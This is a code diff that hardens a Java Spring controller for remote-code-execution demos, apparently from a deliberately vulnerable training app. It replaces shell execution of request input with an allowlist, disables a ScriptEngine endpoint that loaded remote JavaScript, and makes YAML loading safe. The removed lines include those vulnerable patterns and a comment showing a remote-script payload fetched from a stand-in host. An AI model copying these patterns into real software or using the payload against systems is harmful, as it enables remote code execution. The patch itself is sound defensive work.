@@ -5,17 +5,16 @@ import lombok.extern.slf4j.Slf4j;
 import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
+import org.springframework.web.util.HtmlUtils;
 import org.yaml.snakeyaml.Yaml;
 import org.yaml.snakeyaml.constructor.SafeConstructor;
 
-import javax.script.Bindings;
-import javax.script.ScriptContext;
-import javax.script.ScriptEngine;
-import javax.script.ScriptEngineManager;
 import java.io.BufferedInputStream;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
-import java.sql.DriverManager;
+import java.util.Arrays;
+import java.util.HashSet;
+import java.util.Set;
 
 
 /**
@@ -28,13 +27,28 @@ import java.sql.DriverManager;
 @RequestMapping("/rce")
 public class Rce {
 
+    private static final Set<String> ALLOWED_COMMANDS = new HashSet<>(
+            Arrays.asList("whoami", "hostname", "date", "uptime", "id", "uname", "df", "ps", "ls"));
+
     @GetMapping("/runtime/exec")
     public String CommandExec(String cmd) {
-        Runtime run = Runtime.getRuntime();
         StringBuilder sb = new StringBuilder();
 
         try {
-            Process p = run.exec(cmd);
+            if (cmd == null || cmd.trim().isEmpty()) {
+                return "Command not provided";
+            }
+            String[] parts = cmd.trim().split("\\s+");
+            String commandName = parts[0];
+            int lastSlash = commandName.lastIndexOf('/');
+            if (lastSlash >= 0) {
+                commandName = commandName.substring(lastSlash + 1);
+            }
+            if (!ALLOWED_COMMANDS.contains(commandName)) {
+                return "Command not allowed";
+            }
+            ProcessBuilder processBuilder = new ProcessBuilder(parts);
+            Process p = processBuilder.start();
             BufferedInputStream in = new BufferedInputStream(p.getInputStream());
             BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
             String tmpStr;
@@ -51,9 +65,9 @@ public class Rce {
             inBr.close();
             in.close();
         } catch (Exception e) {
-            return e.toString();
+            return HtmlUtils.htmlEscape(e.toString());
         }
-        return sb.toString();
+        return HtmlUtils.htmlEscape(sb.toString());
     }
 
 
@@ -66,8 +80,19 @@ public class Rce {
         StringBuilder sb = new StringBuilder();
 
         try {
-            String[] arrCmd = {"/bin/sh", "-c", cmd};
-            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
+            if (cmd == null || cmd.trim().isEmpty()) {
+                return "Command not provided";
+            }
+            String[] parts = cmd.trim().split("\\s+");
+            String commandName = parts[0];
+            int lastSlash = commandName.lastIndexOf('/');
+            if (lastSlash >= 0) {
+                commandName = commandName.substring(lastSlash + 1);
+            }
+            if (!ALLOWED_COMMANDS.contains(commandName)) {
+                return "Command not allowed";
+            }
+            ProcessBuilder processBuilder = new ProcessBuilder(parts);
             Process p = processBuilder.start();
             BufferedInputStream in = new BufferedInputStream(p.getInputStream());
             BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
@@ -77,28 +102,22 @@ public class Rce {
                 sb.append(tmpStr);
             }
         } catch (Exception e) {
-            return e.toString();
+            return HtmlUtils.htmlEscape(e.toString());
         }
 
-        return sb.toString();
+        return HtmlUtils.htmlEscape(sb.toString());
     }
 
 
     /**
-     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
-     *
-     * curl http://xx.yy/zz.js
-     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
+     * Disabled: ScriptEngine.eval with remote script loading is inherently unsafe.
+     * The endpoint now rejects all requests.
      *
      * @param jsurl js url
      */
     @GetMapping("/jscmd")
-    public void jsEngine(String jsurl) throws Exception{
-        // js nashorn javascript ecmascript
-        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
-        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
-        String cmd = String.format("load(\"%s\")", jsurl);
-        engine.eval(cmd, bindings);
+    public String jsEngine(String jsurl) {
+        return "This endpoint has been disabled for security reasons.";
     }
 
 
@@ -110,7 +129,7 @@ public class Rce {
      */
     @GetMapping("/vuln/yarm")
     public void yarm(String content) {
-        Yaml y = new Yaml();
+        Yaml y = new Yaml(new SafeConstructor());
         y.load(content);
     }
 
